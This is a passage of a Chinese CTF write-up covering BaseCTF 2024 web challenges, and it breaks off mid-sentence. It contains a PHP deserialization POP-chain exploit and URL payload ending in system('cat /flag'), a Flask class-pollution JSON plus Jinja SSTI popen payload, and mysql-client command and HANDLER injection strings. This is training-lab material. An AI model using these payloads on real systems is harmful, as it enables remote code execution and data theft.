class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(__file__);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">substrstr</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$start</span> = <span class="hljs-title function_ invoke__">mb_strpos</span>(<span class="hljs-variable">$data</span>, <span class="hljs-string">&quot;[&quot;</span>);<br>    <span class="hljs-variable">$end</span> = <span class="hljs-title function_ invoke__">mb_strpos</span>(<span class="hljs-variable">$data</span>, <span class="hljs-string">&quot;]&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">mb_substr</span>(<span class="hljs-variable">$data</span>, <span class="hljs-variable">$start</span> + <span class="hljs-number">1</span>, <span class="hljs-variable">$end</span> - <span class="hljs-number">1</span> - <span class="hljs-variable">$start</span>);<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Hacker</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$start</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$end</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&quot;hacker&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$start</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;start=<span class="hljs-variable">$start</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;username=<span class="hljs-string">&quot;hacker&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;end = <span class="hljs-variable language_">$this</span>-&gt;start;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/ctfer/i&#x27;</span>,<span class="hljs-variable">$this</span>-&gt;username))&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Hacker！&#x27;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$c</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;c-&gt;<span class="hljs-title function_ invoke__">c</span>();<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;C&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">T</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$t</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>,<span class="hljs-variable">$args</span></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;t-&gt;t;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">F</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$f</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;f-&gt;f);<br>    &#125;<br><br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">E</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$e</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__isset</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span>&#123;<br>        (<span class="hljs-variable language_">$this</span>-&gt;e)();<br>    &#125;<br><br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">R</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$r</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;r);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ez_ser.from_you&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$ctf</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hacker</span>(<span class="hljs-string">&#x27;&#123;&#123;&#123;&#x27;</span>.<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ez_ser.from_you&#x27;</span>].<span class="hljs-string">&#x27;&#125;&#125;&#125;&#x27;</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\[|\]/i&quot;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;substr&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;NONONO!!!&quot;</span>);<br>    &#125;<br>    <span class="hljs-variable">$pre</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;substr&#x27;</span>])?<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;substr&#x27;</span>]:<span class="hljs-string">&quot;substr&quot;</span>;<br>    <span class="hljs-variable">$ser_ctf</span> = <span class="hljs-title function_ invoke__">substrstr</span>(<span class="hljs-variable">$pre</span>.<span class="hljs-string">&quot;[&quot;</span>.<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$ctf</span>).<span class="hljs-string">&quot;]&quot;</span>);<br>    <span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$ser_ctf</span>);<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&quot;杂鱼~杂鱼~&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
<p>晨曦✌出的太狠了，简单的先分析一下pop链，一下是依次触发的情况</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Hacker::__destruct =&gt; C::__toString =&gt; T::__call =&gt; F::__get =&gt; E::__isset =&gt; R::__invoke<br></code></pre></td></tr></table></figure>
<p>接着考虑绕过__wakeup,使用&amp;进行引用就可以绕过</p>
<p>需要注意的是由于最后有<code>throw new Exception(&quot;杂鱼~杂鱼~&quot;);</code>让__destruct不能正常触发，需要使用gc回收机制，参考<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11843?time__1311=Cq0xuD0DnD203GNem%3DDRDj2QDgGuQ7TQ4D&amp;u_atoken=0114403acb8b70492b4c518ca47812ae&amp;u_asig=1a0c380917263902773186410e0107">GC回收机制</a>,</p>
<p>exp</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Hacker</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$start</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$end</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&quot;hacker&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;username=<span class="hljs-string">&quot;hacker&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;end = <span class="hljs-variable language_">$this</span>-&gt;start;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/ctfer/i&#x27;</span>,<span class="hljs-variable">$this</span>-&gt;username))&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Hacker！&#x27;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$c</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;c-&gt;<span class="hljs-title function_ invoke__">c</span>();<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;C&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">T</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$t</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>,<span class="hljs-variable">$args</span></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;t-&gt;t;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">F</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$f</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;f-&gt;f);<br>    &#125;<br><br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">E</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$e</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__isset</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span>&#123;<br>        (<span class="hljs-variable language_">$this</span>-&gt;e)();<br>    &#125;<br><br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">R</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$r</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;r);<br>    &#125;<br>&#125;<br><span class="hljs-variable">$exp</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Hacker</span>();<br><span class="hljs-variable">$exp</span>-&gt;end=&amp;<span class="hljs-variable">$exp</span>-&gt;username;<br><span class="hljs-variable">$exp</span>-&gt;start=<span class="hljs-keyword">new</span> C;<br><span class="hljs-variable">$exp</span>-&gt;start-&gt;c=<span class="hljs-keyword">new</span> T;<br><span class="hljs-variable">$exp</span>-&gt;start-&gt;c-&gt;t=<span class="hljs-keyword">new</span> F;<br><span class="hljs-variable">$exp</span>-&gt;start-&gt;c-&gt;t-&gt;f=<span class="hljs-keyword">new</span> E;<br><span class="hljs-variable">$exp</span>-&gt;start-&gt;c-&gt;t-&gt;f-&gt;e=<span class="hljs-keyword">new</span> R;<br><span class="hljs-variable">$exp</span>-&gt;start-&gt;c-&gt;t-&gt;f-&gt;e-&gt;r=<span class="hljs-string">&quot;system(&#x27;ls&#x27;);&quot;</span>;<br><span class="hljs-variable">$orange</span>=<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;1&#x27;</span>=&gt;<span class="hljs-variable">$exp</span>,<span class="hljs-string">&#x27;2&#x27;</span>=&gt;<span class="hljs-literal">null</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$orange</span>);<br></code></pre></td></tr></table></figure>
<p>得到的答案需要在本地测试一下前面的内容</p>
<p><img src="/../../images/basectf/basectf2024/ez.png" srcset="/img/loading.gif" lazyload alt="ez"></p>
<p>然后前面的需要进行字符串逃逸，这里不再赘婿，可以看我<a href="https://0ran9ewww.github.io/2024/08/28/nepctf/nepctf2024/#PHP-MASTER">文章</a>,</p>
<p><img src="/../../images/basectf/basectf2024/ez-1.png" srcset="/img/loading.gif" lazyload alt="ez-1"></p>
<p>测出长度是</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">?substr=%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%9f<br>&amp;ez[ser.from_you=a:2:&#123;i:1;O:6:<span class="hljs-string">&quot;Hacker&quot;</span>:3:&#123;s:5:<span class="hljs-string">&quot;start&quot;</span>;O:1:<span class="hljs-string">&quot;C&quot;</span>:1:&#123;s:1:<span class="hljs-string">&quot;c&quot;</span>;O:1:<span class="hljs-string">&quot;T&quot;</span>:1:&#123;s:1:<span class="hljs-string">&quot;t&quot;</span>;O:1:<span class="hljs-string">&quot;F&quot;</span>:1:&#123;s:1:<span class="hljs-string">&quot;f&quot;</span>;O:1:<span class="hljs-string">&quot;E&quot;</span>:1:&#123;s:1:<span class="hljs-string">&quot;e&quot;</span>;O:1:<span class="hljs-string">&quot;R&quot;</span>:1:&#123;s:1:<span class="hljs-string">&quot;r&quot;</span>;s:15:<span class="hljs-string">&quot;system(&#x27;ls /&#x27;);&quot;</span>;&#125;&#125;&#125;&#125;&#125;s:3:<span class="hljs-string">&quot;end&quot;</span>;s:6:<span class="hljs-string">&quot;hacker&quot;</span>;s:8:<span class="hljs-string">&quot;username&quot;</span>;R:9;&#125;i:1;N;&#125;<br></code></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">?substr=%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%9f<br>&amp;ez[ser.from_you=a:2:&#123;i:1;O:6:<span class="hljs-string">&quot;Hacker&quot;</span>:3:&#123;s:5:<span class="hljs-string">&quot;start&quot;</span>;O:1:<span class="hljs-string">&quot;C&quot;</span>:1:&#123;s:1:<span class="hljs-string">&quot;c&quot;</span>;O:1:<span class="hljs-string">&quot;T&quot;</span>:1:&#123;s:1:<span class="hljs-string">&quot;t&quot;</span>;O:1:<span class="hljs-string">&quot;F&quot;</span>:1:&#123;s:1:<span class="hljs-string">&quot;f&quot;</span>;O:1:<span class="hljs-string">&quot;E&quot;</span>:1:&#123;s:1:<span class="hljs-string">&quot;e&quot;</span>;O:1:<span class="hljs-string">&quot;R&quot;</span>:1:&#123;s:1:<span class="hljs-string">&quot;r&quot;</span>;s:20:<span class="hljs-string">&quot;system(&#x27;cat /flag&#x27;);&quot;</span>;&#125;&#125;&#125;&#125;&#125;s:3:<span class="hljs-string">&quot;end&quot;</span>;s:6:<span class="hljs-string">&quot;hacker&quot;</span>;s:8:<span class="hljs-string">&quot;username&quot;</span>;R:9;&#125;i:1;N;&#125;<br></code></pre></td></tr></table></figure>
<p>cx师傅又让我学到了</p>
<h3 id="jinja-mark"><a class="markdownIt-Anchor" href="#jinja-mark"></a> Jinja Mark</h3>
<p>在/flag里面可以fuzz一下得到提示,不确定这个是动态还是静态的，最好自己bp跑一下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">lucky_number=5346<br></code></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python">BLACKLIST_IN_index = [<span class="hljs-string">&#x27;&#123;&#x27;</span>,<span class="hljs-string">&#x27;&#125;&#x27;</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">merge</span>(<span class="hljs-params">src, dst</span>):<br>    <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> src.items():<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">hasattr</span>(dst, <span class="hljs-string">&#x27;__getitem__&#x27;</span>):<br>            <span class="hljs-keyword">if</span> dst.get(k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>                merge(v, dst.get(k))<br>            <span class="hljs-keyword">else</span>:<br>                dst[k] = v<br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">hasattr</span>(dst, k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>            merge(v, <span class="hljs-built_in">getattr</span>(dst, k))<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">setattr</span>(dst, k, v)<br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/magic&#x27;</span>,methods=[<span class="hljs-string">&#x27;POST&#x27;</span>, <span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pollute</span>():<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        <span class="hljs-keyword">if</span> request.is_json:<br>            merge(json.loads(request.data), instance)<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;这个魔术还行吧&quot;</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;我要json的魔术&quot;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;记得用POST方法把魔术交上来&quot;</span><br></code></pre></td></tr></table></figure>
<p>得到了提示，index禁用了花括号，然后这是一个python原生类的题目~暂时没思路了，是要通过原生类进行ssti，还是通过这个进行简单的花括号绕过呢</p>
<p>续言：没错就是进行简单的花括号绕过，用其他代替就好了<code>jinja_env</code> 配置了 Jinja2 的模板引擎环境，通过修改 <code>variable_start_string</code> 和 <code>variable_end_string</code> 来控制模板变量的起始和结束符号。只是我知识面比较窄而已，利用post发包</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;__init__&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;__globals__&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;app&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;jinja_env&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                    <span class="hljs-attr">&quot;variable_start_string&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&lt;&lt;&quot;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;variable_end_string&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&gt;&gt;&quot;</span><br>                <span class="hljs-punctuation">&#125;</span><br>            <span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Content-Type: application/json<br></code></pre></td></tr></table></figure>
<p>最后直接在对应的界面进行简单的ssti注入就行了</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;&lt;<span class="hljs-string">&quot;&quot;</span>.__class__.__bases__[0].__subclasses__()[132].__init__.__globals__[<span class="hljs-string">&#x27;popen&#x27;</span>](<span class="hljs-string">&#x27;cat flag&#x27;</span>).<span class="hljs-built_in">read</span>()&gt;&gt;<br></code></pre></td></tr></table></figure>
<h3 id="back-to-the-future"><a class="markdownIt-Anchor" href="#back-to-the-future"></a> Back to the future</h3>
<p>一时间没想起来怎么写，在nss刷题的时候突然就想起来了，默认去看一下robots.txt，通常不要扫描的都在这里，提醒的是.git然后用githacker这个工具进行恢复，利用git reset --hard 第二个恢复flag</p>
<p>续：有师傅和我说githack不能直接得到，我用的是gitdumper下来再用githacker的，也可以按这么来。</p>
<h3 id="rce-or-sql-inject"><a class="markdownIt-Anchor" href="#rce-or-sql-inject"></a> RCE or Sql Inject</h3>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$sql</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;sql&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/se|ec|;|@|del|into|outfile/i&#x27;</span>, <span class="hljs-variable">$sql</span>)) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;你知道的，不可能有sql注入&quot;</span>);<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/&quot;|\$|`|\\\\/i&#x27;</span>, <span class="hljs-variable">$sql</span>)) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;你知道的，不可能有RCE&quot;</span>);<br>&#125;<br><span class="hljs-variable">$query</span> = <span class="hljs-string">&quot;mysql -u root -p123456 -e \&quot;use ctf;select &#x27;ctfer! You can\\&#x27;t succeed this time! hahaha&#x27;; -- &quot;</span> . <span class="hljs-variable">$sql</span> . <span class="hljs-string">&quot;\&quot;&quot;</span>;<br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$query</span>); ctfer! You can<span class="hljs-string">&#x27;t succeed this time! hahaha ctfer! You can&#x27;</span>t succeed this time! hahaha<br></code></pre></td></tr></table></figure>
<p>学习学习吧，给的hint告诉了这题其实已经是rce的题目了</p>
<p>R! C! E!	mysql远程连接和命令行操作是不是有些区别呢	输个问号看看?</p>
<p>本地mysql连接输入?看看有一行可以注意到（我在物理机测试上并没有，可能是版本问题，之后会在vps上测一下）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">system (\!) Execute a system shell command.<br></code></pre></td></tr></table></figure>
<p>那么就是使用system或者<code>\!</code>执行一个system shell命令</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?sql=%0asystem <span class="hljs-built_in">env</span><br></code></pre></td></tr></table></figure>
<p>冷知识＋1</p>
<h3 id="sql-inject-or-rce"><a class="markdownIt-Anchor" href="#sql-inject-or-rce"></a> Sql Inject or RCE</h3>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;?php<br>highlight_file(__FILE__);<br><span class="hljs-variable">$sql</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;sql&#x27;</span>];<br><span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&#x27;/se|ec|st|;|@|delete|into|outfile/i&#x27;</span>, <span class="hljs-variable">$sql</span>)) &#123;<br>    die(<span class="hljs-string">&quot;你知道的，不可能有sql注入&quot;</span>);<br>&#125;<br><span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&#x27;/&quot;|\$|`|\\\\/i&#x27;</span>, <span class="hljs-variable">$sql</span>)) &#123;<br>    die(<span class="hljs-string">&quot;你知道的，不可能有RCE&quot;</span>);<br>&#125;<br><span class="hljs-variable">$query</span> = <span class="hljs-string">&quot;mysql -u root -p123456 -e \&quot;use ctf;select &#x27;ctfer! You can\\&#x27;t succeed this time! hahaha&#x27;; -- &quot;</span> . <span class="hljs-variable">$sql</span> . <span class="hljs-string">&quot;\&quot;&quot;</span>;<br>system(<span class="hljs-variable">$query</span>); ctfer! You can<span class="hljs-string">&#x27;t succeed this time! hahaha ctfer! You can&#x27;</span>t succeed this time! hahaha<br></code></pre></td></tr></table></figure>
<p>在上一题的基础上过滤了system，并且把过滤的del变成了delete，所以可以考虑从del这方面入手。</p>
<p><code>DELIMITER</code> 是一个用于改变 SQL 语句结束符的命令，通常用于定义存储过程、触发器或函数时，因为这些语句内部会使用 <code>;</code>，而 <code>;</code> 也是 MySQL 默认的语句结束符。简单的说可以把DELIMITER当作；，但是我们可以自定义这个。</p>
<p>handler是MySQL特有的，可以逐行浏览某个表中的数据，格式：</p>
<p>打开表：HANDLER 表名 OPEN ;</p>
<p>查看数据： HANDLER 表名 READ next;</p>
<p>关闭表： HANDLER 表名 READ CLOSE；</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?sql=%0adelimiter orange%0a handler flag openorange%0ahandler flag <span class="hljs-built_in">read</span> next<br></code></pre></td></tr></table></figure>
<p>实际执行的是</p>
